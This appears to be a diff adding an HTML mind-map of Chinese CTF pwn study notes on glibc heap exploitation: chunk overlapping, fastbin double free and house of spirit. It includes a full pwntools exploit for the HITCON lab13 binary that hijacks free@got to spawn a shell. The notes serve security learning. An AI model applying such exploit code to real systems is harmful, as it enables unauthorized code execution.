@@ -1,0 +1,899 @@
+<html>
+<head>
+<META http-equiv="Content-Type" content="text/html; charset=UTF-8">
+<meta content="text/html; charset=utf-8" http-equiv="Content-Type">
+<meta content="text/css" http-equiv="Content-Style-Type">
+<title>CTF PWN11</title>
+</head>
+<body>
+<h1 align="center" class="root">
+<a name="6ldl0u0rgp8p8kk02m2optn4a3">CTF PWN11</a>
+</h1>
+<div align="center" class="globalOverview">
+<img src="CTF PWN11_files/images/CTF PWN11.jpg"></div>
+<h2 class="topic">
+<a name="5v4u49f9jcq2p8mb8bpnl13c38">堆溢出</a>
+</h2>
+<h3 class="topic">
+<a name="0pu9j5h0hgcum26idh78kve2e6">&nbsp;Chunk Extend and Overlapping</a>
+</h3>
+<h3 class="topic">
+<a name="4v5m5ccpqt1h7uvvdko9m5s441">&nbsp;&nbsp;介绍与利用前提</a>
+</h3>
+<h3 class="topic">
+<a name="7k6u3r630c4e0slbbpa0aqsmuh">&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN11_files/56kgheqk84gkiulsds5oj30a9u.png"></p>
+<h3 class="topic">
+<a name="7dtb8raep6g70gglm6369nbpip">&nbsp;&nbsp;漏洞原理：即ptmalloc对chunk进行操作时是根据chunk头的信息去寻址chunk或确定chunk大小</a>
+</h3>
+<h3 class="topic">
+<a name="7a1voclpo0u5g45lh7gddsgsai">&nbsp;&nbsp;&nbsp;获得本chunk大小</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN11_files/1j64e3jf34jge45lrd3ve2k9qn.png"></p>
+<h3 class="topic">
+<a name="4fmebrdnr40t3ptv0jvphnhr90">&nbsp;&nbsp;&nbsp;&nbsp;获得下一个chunk块的地址</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN11_files/7t369bpqrrj82830c6a417n71v.png"></p>
+<h3 class="topic">
+<a name="7rp2m2loe7rd38ntqdluj0kjjc">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;或获得前一个chunk的大小和地址</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN11_files/047bgj6nchddpfd3vtb5k8jedu.png"></p>
+<h3 class="topic">
+<a name="2pcecbq2sism1vikiqskhl3mkl">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;判断当前chunk的使用状态</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN11_files/04b1l52m5etchn1qdjld3ec5jf.png"></p>
+<h3 class="topic">
+<a name="0pcjkq6r0mmq6rpn6ddvl06a04">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;chunk extend就是通过控制size和pre_size域来实现跨越块操作从而导致overlapping的。</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN11_files/1v5565ulg2q1oees22kcjdamr4.png"></p>
+<h3 class="topic">
+<a name="3efvvfn2btctugov9mvihevgjq">&nbsp;&nbsp;堆扩展攻击的用途</a>
+</h3>
+<h3 class="topic">
+<a name="7p3lcq71nl14rfbpe7q1le76c5">&nbsp;&nbsp;&nbsp;主要是修改chunk中的数据内容，从而间接泄露信息或控制程序流程</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN11_files/6fa0u4tmjv1o4gb7omf42786rl.png"></p>
+<h3 class="topic">
+<a name="7t7l5fkiobhbh5glb29j2cs52m">&nbsp;&nbsp;示例</a>
+</h3>
+<h3 class="topic">
+<a name="3mft0i2jngn0e2gadlj1el4lm8">&nbsp;&nbsp;&nbsp;基本示例1：对inuse的fastbin进行extend</a>
+</h3>
+<h3 class="topic">
+<a name="0m2n0steskhhhn469mp6trnc6f">&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN11_files/74ub53rgomocnti1e48c8cplv8.png"></p>
+<h3 class="topic">
+<a name="4nlvld089jra4siqh4ukmrp02v">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN11_files/2r2st453uqhnedueov1891391h.png"></p>
+<h3 class="topic">
+<a name="6kkratmupakq28f04jin3qabva">&nbsp;&nbsp;&nbsp;基本示例2：对inuse的smallbin进行extend</a>
+</h3>
+<h3 class="topic">
+<a name="326bnn3ulsrsrud5h6cpmvtrjk">&nbsp;&nbsp;&nbsp;&nbsp;注意除了fastbin范围的chunk被释放后会被置入fastbin链表中，其他范围大小的chunk释放后均会被置于Unsorted bin中</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN11_files/577n6kbv43ugsvkg7ane7jgffr.png"></p>
+<h3 class="topic">
+<a name="25ovkk1gd3f8201o3jumuiotfe">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;不处于fastbin大小范围的chunk如果于topchunk相邻，则该chunk释放时会与topchunk合并</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN11_files/7chh5n32o0mabhb0l1bpdpaif7.png"></p>
+<h3 class="topic">
+<a name="4j1dgvh5bjm0j219nfjur4su39">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN11_files/04o1ad8gurstputm8cjpbg9qdm.png"></p>
+<h3 class="topic">
+<a name="4udd3fb6jq02lpt5k60ieduu0d">&nbsp;&nbsp;&nbsp;基本示例3：对free的smallbin进行extend</a>
+</h3>
+<h3 class="topic">
+<a name="2mc56t9sarmkqjtvpsvq1gneh4">&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN11_files/7u3ri6rq5a0t5bcp81d74i21ue.png"></p>
+<h3 class="topic">
+<a name="6amqes969pv55u9ectt4ptbdum">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN11_files/0epk4m03l59m9gghu1r0l6qhfb.png"></p>
+<h3 class="topic">
+<a name="2c5qq0tsmcqhkm4ophsa6uc0i0">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN11_files/3e85skb2kin37hjtj22j1crta9.png"></p>
+<h3 class="topic">
+<a name="2fr8s0lp8ieee5vtsbs472d6i5">&nbsp;&nbsp;&nbsp;基本示例4：通过extend后向overlapping</a>
+</h3>
+<h3 class="topic">
+<a name="3v622n0kmgm4tt2jkae8jv4b5b">&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN11_files/27vq1l84bvnm827d7fh4335fml.png"></p>
+<h3 class="topic">
+<a name="7a1ca7ujj98lofotaor006k17l">&nbsp;&nbsp;&nbsp;基本示例5：通过extend前向overlapping</a>
+</h3>
+<h3 class="topic">
+<a name="1elekocikut351sipdukbgfu8u">&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN11_files/0qsts2dmr0oqosj4aefq6j9pme.png"></p>
+<h3 class="topic">
+<a name="00dim025k908im389942tfc0vp">&nbsp;&nbsp;实例</a>
+</h3>
+<h3 class="topic">
+<a name="5tdfabciedo5gks4kv9gfpuiud">&nbsp;&nbsp;&nbsp;HITCON Trainging lab13</a>
+</h3>
+<h3 class="topic">
+<a name="1u0akigbp6tmi2681b5iteq1av">&nbsp;&nbsp;&nbsp;&nbsp;本题详细分析可见之前的ctf-pwn-扩展堆利用技巧</a>
+</h3>
+<h3 class="topic">
+<a name="27rrnhgnm2980g32hf72dn62aa">&nbsp;&nbsp;&nbsp;&nbsp;程序基本信息</a>
+</h3>
+<h3 class="topic">
+<a name="3f686si11tdqejr5agu6r0lp4f">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN11_files/3e6b2bbkgbt43k05md5vtnd0uf.png"></p>
+<h3 class="topic">
+<a name="4rk0lq2dqo7scqv8ujkuho97k6">&nbsp;&nbsp;&nbsp;&nbsp;程序基本功能</a>
+</h3>
+<h3 class="topic">
+<a name="5f5sfqnkdnmh9cmlqlqv6jeode">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN11_files/6eniveq83o8v11jh7ont4e3so1.png"></p>
+<h3 class="topic">
+<a name="68kkceqv3hd0b49uulgip2p7ne">&nbsp;&nbsp;&nbsp;&nbsp;漏洞利用</a>
+</h3>
+<h3 class="topic">
+<a name="4rnsmaei4ld3945leebb0nnh1v">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN11_files/1sm54ngq5beg7bdkf4m7g243qe.png"></p>
+<h3 class="topic">
+<a name="4mmqf9vrvih8f9af1073ulls75">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;exp</a>
+</h3>
+<h3 class="topic">
+<a name="6i1vs887cqbkd0mudib6gvpdj7">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#!/usr/bin/env python&#13;
+# -*- coding: utf-8 -*-&#13;
+&#13;
+from pwn import *&#13;
+&#13;
+r = process('./heapcreator')&#13;
+heap = ELF('./heapcreator')&#13;
+libc = ELF('./libc.so.6')&#13;
+&#13;
+&#13;
+def create(size, content):&#13;
+    r.recvuntil(":")&#13;
+    r.sendline("1")&#13;
+    r.recvuntil(":")&#13;
+    r.sendline(str(size))&#13;
+    r.recvuntil(":")&#13;
+    r.sendline(content)&#13;
+&#13;
+&#13;
+def edit(idx, content):&#13;
+    r.recvuntil(":")&#13;
+    r.sendline("2")&#13;
+    r.recvuntil(":")&#13;
+    r.sendline(str(idx))&#13;
+    r.recvuntil(":")&#13;
+    r.sendline(content)&#13;
+&#13;
+&#13;
+def show(idx):&#13;
+    r.recvuntil(":")&#13;
+    r.sendline("3")&#13;
+    r.recvuntil(":")&#13;
+    r.sendline(str(idx))&#13;
+&#13;
+&#13;
+def delete(idx):&#13;
+    r.recvuntil(":")&#13;
+    r.sendline("4")&#13;
+    r.recvuntil(":")&#13;
+    r.sendline(str(idx))&#13;
+&#13;
+&#13;
+free_got = 0x602018&#13;
+create(0x18, "dada")  # 0&#13;
+create(0x10, "ddaa")  # 1&#13;
+# overwrite heap 1's struct's size to 0x41&#13;
+edit(0, "/bin/sh\x00" + "a" * 0x10 + "\x41")&#13;
+# trigger heap 1's struct to fastbin 0x40&#13;
+# heap 1's content to fastbin 0x20&#13;
+delete(1)&#13;
+# new heap 1's struct will point to old heap 1's content, size 0x20&#13;
+# new heap 1's content will point to old heap 1's struct, size 0x30&#13;
+# that is to say we can overwrite new heap 1's struct&#13;
+# here we overwrite its heap content pointer to free@got&#13;
+create(0x30, p64(0) * 4 + p64(0x30) + p64(heap.got['free']))  #1&#13;
+# leak freeaddr&#13;
+show(1)&#13;
+r.recvuntil("Content : ")&#13;
+data = r.recvuntil("Done !")&#13;
+&#13;
+free_addr = u64(data.split("\n")[0].ljust(8, "\x00"))&#13;
+libc_base = free_addr - libc.symbols['free']&#13;
+log.success('libc base addr: ' + hex(libc_base))&#13;
+system_addr = libc_base + libc.symbols['system']&#13;
+#gdb.attach(r)&#13;
+# overwrite free@got with system addr&#13;
+edit(1, p64(system_addr))&#13;
+# trigger system("/bin/sh")&#13;
+delete(0)&#13;
+r.interactive()</a>
+</h3>
+<h3 class="topic">
+<a name="6pk0u07221q3rpv5hnb105haaf">&nbsp;&nbsp;&nbsp;2015 hacklu bookstore(待补充）</a>
+</h3>
+<h3 class="topic">
+<a name="0mgmjrv67utmcpb54phb9bv13g">&nbsp;&nbsp;&nbsp;&nbsp;程序基本信息</a>
+</h3>
+<h3 class="topic">
+<a name="40jcgd8dsh31p97tqp0ah9assr">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN11_files/6n9r1ufie012g8d59cp1iv8l1f.png"></p>
+<h3 class="topic">
+<a name="1d3r9tmmgk8edcdeoobe6k8jj3">&nbsp;&nbsp;&nbsp;&nbsp;程序基本功能</a>
+</h3>
+<h3 class="topic">
+<a name="57l58ti5iq4e1ne4o4n7fl4k7n">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN11_files/448th39vdhqh4j5q6s6t1bpfnt.png"></p>
+<h3 class="topic">
+<a name="2ucnhv5lgfmdkubd6f07dc40bl">&nbsp;&nbsp;&nbsp;&nbsp;漏洞利用思路</a>
+</h3>
+<h3 class="topic">
+<a name="5g75jfmp38tq8fe6iectau1ds3">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN11_files/4oh4ovrlvt2ooav9rb3m2ajf8f.png"></p>
+<h3 class="topic">
+<a name="6tgq2fj1bvnkhdc2rn70mtf5ss">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN11_files/1i18djdmfgp1m9lafsesfogd3q.png"></p>
+<h3 class="topic">
+<a name="5rll20j2sbpv5r9769ki2h1dhu">&nbsp;&nbsp;相关题目</a>
+</h3>
+<h3 class="topic">
+<a name="6hhfqe848hrtjcr82k25vukime">&nbsp;&nbsp;&nbsp;2016 Nuit du Hack CTF Quals : night deamonic heap</a>
+</h3>
+<h3 class="topic">
+<a name="02kp3t0l9vuiu1quj44fn9mep8">&nbsp;Fastbin Attack</a>
+</h3>
+<h3 class="topic">
+<a name="3rkc1h4e7idl1q4l5aon66bseg">&nbsp;&nbsp;介绍</a>
+</h3>
+<h3 class="topic">
+<a name="11nsgoil1bkcr0hp0mjj48qu4r">&nbsp;&nbsp;&nbsp;即针对fastbin上的chunk进行的攻击（注意fastbin是通过单链表进行链接的）</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN11_files/5c07m1oc52na1ukt0aeh9jqovt.png"></p>
+<h3 class="topic">
+<a name="1g818ou33divfugreiv30am9kd">&nbsp;&nbsp;&nbsp;&nbsp;fastbin double free和house of spirit倾向于将伪造的chunk通过free的方式链入fast bin中，然后通过再次分配方式获得伪造chunk内存的读写权限，此种方式不需要修改chunk中的fd指针</a>
+</h3>
+<h3 class="topic">
+<a name="7n53a26f9lq04cpaf6tr50761u">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;free函数的执行涉及更多的检验机制判断，所以要求fakechunk要精心伪造本chunk和下一个chunk的size字段</a>
+</h3>
+<h3 class="topic">
+<a name="715oo7d97o5942ulfethb9lh6c">&nbsp;&nbsp;&nbsp;&nbsp;alloc to stack和arbitrary alloc一般直接通过修改chunk的fd指针将fake chunk直接链入fast bin中，然后通过malloc获得指定内存的读写权限，上面两种方法不同在于必须可以直接修改chunk的fd指针</a>
+</h3>
+<h3 class="topic">
+<a name="0d0dms5ad61jnbflt9j4039vo4">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;因为不需要通过free函数将fakechunk置入fastbin中，仅需要使用malloc申请指定内存空间，而malloc的检验机制更为宽松(相较于free函数)，所以仅仅需要伪造本chunk的size字段即可</a>
+</h3>
+<h3 class="topic">
+<a name="7g6abu7r8622ofa9abdmdnfink">&nbsp;&nbsp;fastbin申请释放原理</a>
+</h3>
+<h3 class="topic">
+<a name="65oh13qgc5f9daii8tmk6viuk4">&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN11_files/48gi3nruvgb7r34vls5etvql9t.png"></p>
+<h3 class="topic">
+<a name="22tj4u7blogg5tut97d0ppulhq">&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN11_files/57m89j8r523vng64v4qtuuja7t.png"></p>
+<h3 class="topic">
+<a name="43asv8e7ahe4895l3qbtm9nbkr">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN11_files/3p3k9irbio4n9k72akl10o8ggt.png"></p>
+<h3 class="topic">
+<a name="1kk4amamvds3jtjkqc9c1vortp">&nbsp;&nbsp;Fastbin Double Free</a>
+</h3>
+<h3 class="topic">
+<a name="5h0709c27jlljf23t3pg44f24o">&nbsp;&nbsp;&nbsp;介绍</a>
+</h3>
+<h3 class="topic">
+<a name="5r7aaef9p62eq5hul56eehj5b6">&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN11_files/4rqu68jr1477cdjvmirtta1n7v.png"></p>
+<h3 class="topic">
+<a name="0d0v3on4jvloc9g4u46grggqec">&nbsp;&nbsp;&nbsp;漏洞原理演示</a>
+</h3>
+<h3 class="topic">
+<a name="48jftqijo43ii0mvruhp11mmqa">&nbsp;&nbsp;&nbsp;&nbsp;当连续两次释放同一个堆块的时候，会报双重释放的错误</a>
+</h3>
+<h3 class="topic">
+<a name="6rfq4gcqccb4o8emljalgr8ar9">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN11_files/2jid5kohh20756dlmsogf0gr05.png"></p>
+<h3 class="topic">
+<a name="4d1evi5ba02gk0b0msnoeoodvj">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN11_files/7pgs8ajddj78lntfpr19am5r1f.png"></p>
+<h3 class="topic">
+<a name="111pg0d684h1p6vrgddn4pig73">&nbsp;&nbsp;&nbsp;&nbsp;当同一个指针被间隔释放的时候，就可以绕过free函数的验证</a>
+</h3>
+<h3 class="topic">
+<a name="4c7t2973aja1oa6cdag76frd56">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN11_files/193kle0t7ptfmasukivsnr1o3u.png"></p>
+<h3 class="topic">
+<a name="5k0db9mre20g3cdesmarl2kbbh">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN11_files/7ptfg8r0vs3tbdlojk2u89tob1.png"></p>
+<h3 class="topic">
+<a name="6po1ohvbi7vflhrabonnttigqt">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN11_files/36s2vjp7epqtcm72eah63h1534.png"></p>
+<h3 class="topic">
+<a name="38bpcr8sor0nrkiii172suqrfk">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN11_files/6lmccet0qk8in2sllctq1158c5.png"></p>
+<h3 class="topic">
+<a name="5sg4idui9eok7s430a81askjqn">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;注意在执行malloc(fake_bss_chunk);时malloc存在验证，要求伪造的fake_bss_chunk中的size字段必须和本次申请的内存地址相对应，否则会报错，所以构造fake_bss_chunk需要注意size字段</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN11_files/7nb1guhsirq57kbupdsrkl3o86.png"></p>
+<h3 class="topic">
+<a name="714vupq8kh5hros4pvo356dbqi">&nbsp;&nbsp;&nbsp;总结</a>
+</h3>
+<h3 class="topic">
+<a name="49aovbdjdpcc1esp74bblc3hts">&nbsp;&nbsp;&nbsp;&nbsp;fastbin double free主要时通过使用多个指针指向同一个chunk，从而达到修改chunk中数据的目的，进一步通过修改chunk中的fd指针，从而伪造fastbin链表，从而在将堆块申请到指定内存地址处，相当于任意地址写任意数据</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN11_files/6lagpini8s52p644etvb2tgv9l.png"></p>
+<h3 class="topic">
+<a name="13d34rugc5jehueuh4tq5toeaa">&nbsp;&nbsp;House Of Spirit</a>
+</h3>
+<h3 class="topic">
+<a name="40tkrl7mdsou0ujeqtfuqtv5rb">&nbsp;&nbsp;&nbsp;介绍</a>
+</h3>
+<h3 class="topic">
+<a name="7g8gnio41ge6lt479t9ivlmpnl">&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN11_files/622niuj0s7lejlfk2847o36of1.png"></p>
+<h3 class="topic">
+<a name="1nh5jrrpib76cn9k0vqq6ej5lk">&nbsp;&nbsp;&nbsp;示例</a>
+</h3>
+<h3 class="topic">
+<a name="3olrmgfo5cgeenmruqddc1ejg6">&nbsp;&nbsp;&nbsp;&nbsp;how2heap上的例子</a>
+</h3>
+<h3 class="topic">
+<a name="6al4qkqcqi1ksmvdo3cteq3i1k">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN11_files/7v48t8g7srrra94g6kjvm9p8p6.png"></p>
+<h3 class="topic">
+<a name="1fkslge27gdefjoj6cdjh39vrl">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN11_files/58u4ogilgabkseqe2kpsmgt2nj.png"></p>
+<h3 class="topic">
+<a name="12a12eh72mkphqb8v76i7f0fpn">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;例子中申请了一个数组，共10个元素，每个元素8字节，注释中说该数组包括两个chunk，推测该数组就是用于伪造fastbin的，内存如右图</a>
+</h3>
+<h3 class="topic">
+<a name="1miqjp5uukqfpn7im02agbeoor">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fake_chunks[0]</a>
+</h3>
+<h3 class="topic">
+<a name="0hai9hri0resnko11viccd0e7g">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fake_chunks[1]</a>
+</h3>
+<h3 class="topic">
+<a name="348hju8r30k081soks8h6sb074">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;被置为0x40，则此处为fakec_hunk1的size字段</a>
+</h3>
+<h3 class="topic">
+<a name="4u4nqs135acjki7j9j2ntq419s">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fake_chunks[2]</a>
+</h3>
+<h3 class="topic">
+<a name="2tebpb0qclu6hnkdmqbd1ivghi">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fake_chunks[3]</a>
+</h3>
+<h3 class="topic">
+<a name="11lnkab223q48v5av2evqk1hek">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fake_chunks[4]</a>
+</h3>
+<h3 class="topic">
+<a name="226cp2v5b80u1iipke2k9bdv90">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fake_chunks[5]</a>
+</h3>
+<h3 class="topic">
+<a name="14pfu470sdr92da8p70q5sts63">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fake_chunks[6]</a>
+</h3>
+<h3 class="topic">
+<a name="58c4l3ru7il8nm2pgj417uud6v">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fake_chunks[7]</a>
+</h3>
+<h3 class="topic">
+<a name="75l9tkvq5ld8qrmoopr22139pn">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fake_chunks[8]</a>
+</h3>
+<h3 class="topic">
+<a name="0njbrs8voqc7qmpgfuc89m5sem">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fake_chunks[9]</a>
+</h3>
+<h3 class="topic">
+<a name="6nsgujoh113ngegr00ldldanc1">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;被置为0x40，则此处为fakec_hunk2的size字段</a>
+</h3>
+<h3 class="topic">
+<a name="4c0mh38uua37v2e9bva1ub6lpf">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fakechunk1,该chunk大小为0x40，从数组下标2~7的内存为该chunk的用户空间</a>
+</h3>
+<p class="summary">(<a href="#1miqjp5uukqfpn7im02agbeoor">fake_chunks[0]</a>, <a href="#0hai9hri0resnko11viccd0e7g">fake_chunks[1]</a>, <a href="#4u4nqs135acjki7j9j2ntq419s">fake_chunks[2]</a>, <a href="#2tebpb0qclu6hnkdmqbd1ivghi">fake_chunks[3]</a>, <a href="#11lnkab223q48v5av2evqk1hek">fake_chunks[4]</a>, <a href="#226cp2v5b80u1iipke2k9bdv90">fake_chunks[5]</a>, <a href="#14pfu470sdr92da8p70q5sts63">fake_chunks[6]</a>, <a href="#58c4l3ru7il8nm2pgj417uud6v">fake_chunks[7]</a>)</p>
+<h3 class="topic">
+<a name="11e77rjilbr0j772fi5k661aou">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fakechunk2，这里设置该chunk的size字段为0x1234，就是为了在释放fake_chunk1的时候绕过free函数的检查</a>
+</h3>
+<p class="summary">(<a href="#75l9tkvq5ld8qrmoopr22139pn">fake_chunks[8]</a>, <a href="#0njbrs8voqc7qmpgfuc89m5sem">fake_chunks[9]</a>)</p>
+<h3 class="topic">
+<a name="1plckcf8fhfq34qlbeotpnmqq1">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;通过将内存空间看成chunk并进行相应数据的布置(为了绕过free函数检验)，可以使用free(&amp;fake_chunk[2])将fakechunk1链入fastbin，之后只要malloc(0x30),就可以得到内存&amp;fake_chunk[2]到&amp;fake_chunk[7]之间的读写权限</a>
+</h3>
+<h3 class="topic">
+<a name="4rulu44p5d7n52btdho7ptkkk5">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;此种漏洞利用方式通常用于获得关键内存的读写权限（本例中为&amp;fake_chunk[2]到&amp;fake_chunk[7]之间的内存），使用的前提是需要具备正常读写关键内存前后内存空间的权限(即需要能够修改fake_chunk[1]、fake_chunk[9]中的数据，从而绕过free函数检验)</a>
+</h3>
+<h3 class="topic">
+<a name="1kkmjkpncpr4ho3qbp31gqh60s">&nbsp;&nbsp;&nbsp;&nbsp;另一个示例</a>
+</h3>
+<h3 class="topic">
+<a name="2mjq0t7lfovklifa7qg1o3b6kk">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN11_files/3gd5kfiumd5epebn7g9912ahtt.png"></p>
+<h3 class="topic">
+<a name="1m2km5j1f45k1eie49tco2n2gb">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;绕过free检验的关键是被free的chunk的size字段和下一个chunk的size字段，free函数中对该两个字段有如下检验</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN11_files/11h2udp7tq0ap50op5tf573e76.png"></p>
+<h3 class="topic">
+<a name="0qunajm0752cofpnh6t8eetodk">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;为了让伪造的块进入到正常的free流程，所以要使得构造的当前chunk的size字段的mmp对应位是0就行了。</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN11_files/3hcuphumf0t3ualu9198pi7fb6.png"></p>
+<h3 class="topic">
+<a name="0jjb4jrt39vlik4638mjfhj39m">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;对被释放chunk的下一个chunk的size字段的大小也有要求</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN11_files/7shntpo667863n3t7pgmsp022u.png"></p>
+<h3 class="topic">
+<a name="7aifenjccu9n0797v781jqgd8i">&nbsp;&nbsp;&nbsp;总结</a>
+</h3>
+<h3 class="topic">
+<a name="2inmpacc29mjvjenhdnkf917fp">&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN11_files/4nt0dstc5qef29tcjpfhkfcrpl.png"></p>
+<h3 class="topic">
+<a name="3prgn1mmjbclci29hqbojk4pl1">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;关键需要能够目标内存前后内存中的数据，才能获得目标内存的读写权限</a>
+</h3>
+<h3 class="topic">
+<a name="6b4ofpk2f258dpta8hu7ctfcgc">&nbsp;&nbsp;&nbsp;相关资料</a>
+</h3>
+<h3 class="topic">
+<a name="39m84k2c65gnq6l7lkpkeeui2g">&nbsp;&nbsp;&nbsp;&nbsp;https://www.anquanke.com/post/id/85357</a>
+</h3>
+<h3 class="topic">
+<a name="37907k9uslkkoqhn2j49qbp3c0">&nbsp;&nbsp;&nbsp;&nbsp;https://paper.seebug.org/521/</a>
+</h3>
+<h3 class="topic">
+<a href="https://blog.csdn.net/xiaoi123/article/details/81482385" name="4de3su3d3pud3dsik1pp6f6iq2">&nbsp;&nbsp;&nbsp;&nbsp;https://blog.csdn.net/xiaoi123/article/details/81482385</a>
+</h3>
+<h3 class="topic">
+<a name="03clkakq5lgqus9mgdtcte9jg0">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;讲的清楚</a>
+</h3>
+<h3 class="topic">
+<a href="https://bbs.ichunqiu.com/thread-43678-1-1.html?from=csdn" name="281l0c7idvuae5vvo9663rn6j5">&nbsp;&nbsp;&nbsp;&nbsp;https://bbs.ichunqiu.com/thread-43678-1-1.html?from=csdn</a>
+</h3>
+<h3 class="topic">
+<a name="386jqo6lgdpbskvs0eijmq72u5">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;与上同</a>
+</h3>
+<h3 class="topic">
